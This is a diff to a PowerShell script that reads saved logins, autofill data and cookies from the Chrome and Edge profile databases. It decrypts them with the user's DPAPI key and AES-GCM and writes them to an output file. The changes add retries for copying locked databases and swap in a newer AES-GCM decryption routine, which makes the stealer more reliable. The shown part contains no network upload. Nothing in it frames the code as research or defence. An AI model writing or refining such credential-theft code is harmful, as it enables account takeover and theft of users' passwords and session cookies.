@@ -33,30 +33,19 @@ try {
 
     Add-Type -AssemblyName System.Security
 
-    # --- AES-GCM (PS 5.1 compatible) ---
-    function Decrypt-AesGcm {
-        param([byte[]]$Key, [byte[]]$Nonce, [byte[]]$Cipher, [byte[]]$Tag)
-        $aes = [System.Security.Cryptography.Aes]::Create()
-        $aes.Mode = [System.Security.Cryptography.CipherMode]::GCM
-        $aes.Key = $Key
-        $aes.IV = $Nonce
-        $aes.Tag = $Tag
-        $dec = $aes.CreateDecryptor()
-        $plain = $dec.TransformFinalBlock($Cipher, 0, $Cipher.Length)
-        $dec.Dispose(); $aes.Dispose()
-        return $plain
-    }
-
+    # --- DECRYPT HELPERS ---
     function Decrypt-Blob {
         param([byte[]]$Blob, [byte[]]$Key)
         if (-not $Blob -or $Blob.Length -eq 0) { return "" }
         try {
             if ($Blob.Length -gt 15 -and $Blob[0] -eq 118 -and $Blob[1] -eq 49 -and $Blob[2] -eq 48) {
-                # v10 prefix -> AES-GCM
-                $nonce = $Blob[3..14]
+                $nonce  = $Blob[3..14]
                 $cipher = $Blob[15..($Blob.Length-17)]
-                $tag = $Blob[($Blob.Length-16)..($Blob.Length-1)]
-                $plain = Decrypt-AesGcm -Key $Key -Nonce $nonce -Cipher $cipher -Tag $tag
+                $tag    = $Blob[($Blob.Length-16)..($Blob.Length-1)]
+                $gcm = New-Object System.Security.Cryptography.AesGcm($Key)
+                $plain = New-Object byte[] $cipher.Length
+                $gcm.Decrypt($nonce, $cipher, $tag, $plain)
+                $gcm.Dispose()
                 return [System.Text.Encoding]::UTF8.GetString($plain)
             } else {
                 $plain = [System.Security.Cryptography.ProtectedData]::Unprotect($Blob, $null, 'CurrentUser')
@@ -76,6 +65,17 @@ try {
         } catch { return $null }
     }
 
+    function Copy-LockedFile {
+        param([string]$Src, [string]$Dst)
+        for ($i = 0; $i -lt 5; $i++) {
+            try {
+                Copy-Item $Src $Dst -Force -ErrorAction Stop
+                return $true
+            } catch { Start-Sleep -Milliseconds 200 }
+        }
+        return $false
+    }
+
     $browsers = @{
         "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
         "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
@@ -93,7 +93,7 @@ try {
             $webDb = Join-Path $pd.FullName "Web Data"
             if (-not (Test-Path $webDb) -or -not $sqliteLoaded) { continue }
             $tmp = "$env:TEMP\ab_web.db"
-            Copy-Item $webDb $tmp -Force
+            if (-not (Copy-LockedFile $webDb $tmp)) { "  web db locked" | Out-File $out -Append; continue }
             try {
                 $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
                 $conn.Open()
@@ -138,7 +138,7 @@ try {
             $loginDb = Join-Path $pd.FullName "Login Data"
             if (-not (Test-Path $loginDb)) { continue }
             $tmp = "$env:TEMP\ab_login.db"
-            Copy-Item $loginDb $tmp -Force
+            if (-not (Copy-LockedFile $loginDb $tmp)) { continue }
             try {
                 $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
                 $conn.Open()
@@ -156,7 +156,7 @@ try {
     }
     "" | Out-File $out -Append
 
-    # --- COOKIES (high value only) ---
+    # --- COOKIES ---
     "--- COOKIES ---" | Out-File $out -Append
     foreach ($b in $browsers.Keys) {
         $base = $browsers[$b]
@@ -168,7 +168,7 @@ try {
             $cookieDb = Join-Path $pd.FullName "Network\Cookies"
             if (-not (Test-Path $cookieDb)) { continue }
             $tmp = "$env:TEMP\ab_cookies.db"
-            Copy-Item $cookieDb $tmp -Force
+            if (-not (Copy-LockedFile $cookieDb $tmp)) { continue }
             try {
                 $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
                 $conn.Open()
